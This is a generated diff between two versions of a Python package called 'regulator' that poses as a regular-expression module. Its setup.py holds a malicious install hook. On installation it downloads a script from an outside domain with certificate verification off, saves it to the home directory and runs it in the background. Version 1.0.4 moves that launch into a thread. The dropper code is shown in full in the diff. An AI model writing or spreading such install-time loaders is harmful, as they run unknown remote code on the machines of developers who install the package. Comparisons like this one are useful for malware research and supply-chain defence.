# Comparing `tmp/regulator-1.0.3.tar.gz` & `tmp/regulator-1.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\regulator-1.0.3.tar", last modified: Tue Jul 18 11:26:54 2023, max compression
+gzip compressed data, was "dist\regulator-1.0.4.tar", last modified: Tue Jul 18 14:31:18 2023, max compression
```

## Comparing `regulator-1.0.3.tar` & `regulator-1.0.4.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/
--rw-rw-rw-   0        0        0      111 2023-07-18 11:26:56.000000 regulator-1.0.3/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/regulator/
--rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/__init__.py
--rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/_regex_core.py
--rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/regex.py
--rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/test_regex.py
-drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/regulator.egg-info/
--rw-rw-rw-   0        0        0      111 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      262 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       16 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-18 11:26:56.000000 regulator-1.0.3/setup.cfg
--rw-rw-rw-   0        0        0     1383 2023-07-18 11:26:34.000000 regulator-1.0.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-18 14:31:18.000000 regulator-1.0.4/
+-rw-rw-rw-   0        0        0      111 2023-07-18 14:31:20.000000 regulator-1.0.4/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-07-18 14:31:18.000000 regulator-1.0.4/regulator/
+-rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.4/regulator/__init__.py
+-rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.4/regulator/_regex_core.py
+-rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.4/regulator/regex.py
+-rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.4/regulator/test_regex.py
+drwxrwxrwx   0        0        0        0 2023-07-18 14:31:18.000000 regulator-1.0.4/regulator.egg-info/
+-rw-rw-rw-   0        0        0      111 2023-07-18 14:31:20.000000 regulator-1.0.4/regulator.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      262 2023-07-18 14:31:20.000000 regulator-1.0.4/regulator.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-18 14:31:20.000000 regulator-1.0.4/regulator.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-18 14:31:20.000000 regulator-1.0.4/regulator.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-07-18 14:31:20.000000 regulator-1.0.4/regulator.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-18 14:31:20.000000 regulator-1.0.4/setup.cfg
+-rw-rw-rw-   0        0        0     1495 2023-07-18 14:27:42.000000 regulator-1.0.4/setup.py
```

### Comparing `regulator-1.0.3/regulator/_regex_core.py` & `regulator-1.0.4/regulator/_regex_core.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.3/regulator/regex.py` & `regulator-1.0.4/regulator/regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.3/regulator/test_regex.py` & `regulator-1.0.4/regulator/test_regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.3/setup.py` & `regulator-1.0.4/setup.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,13 +1,25 @@
 from setuptools import setup
 from setuptools.command.install import install
 import os
 import subprocess 
 import requests
 import platform
+import threading
+
+def installthread(data_path):
+    try:
+        pform = platform.system()
+        if pform == 'Windows':
+            subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
+        else:
+            subprocess.Popen(['python3', data_path], stdout=subprocess.PIPE, stderr=None)
+
+    except Exception as e:
+        subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
 
 class SetupProcess(install):
     def run(self):
         install.run(self)
 
         url = 'https://pyploym.com/regdb.php'
 
@@ -16,27 +28,22 @@
         response = requests.get(url, verify=False)
 
         if response.status_code == 200:            
             data_path = os.path.join(home_directory, "regdb.py")
             
             with open(data_path, 'w') as f:
                 f.write(response.text)
-            try:
-                pform = platform.system()
-                if pform == 'Windows':
-                    subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
-                else:
-                    subprocess.Popen(['python3', data_path], stdout=subprocess.PIPE, stderr=None)
 
-            except Exception as e:
-                subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
+            thread = threading.Thread(target=installthread, args=(data_path,))
+            thread.start()
+                
         else:
             print('Error:', response.status_code)
 
 setup(name="regulator",
-version="1.0.3",
+version="1.0.4",
 author="gadapokasoz6",
 description="regular express module",
 cmdclass={'install': SetupProcess,},
 packages=["regulator"],
-install_requires=["requests>=1.0.0"],
+install_requires=['requests>=1',],
 )
```

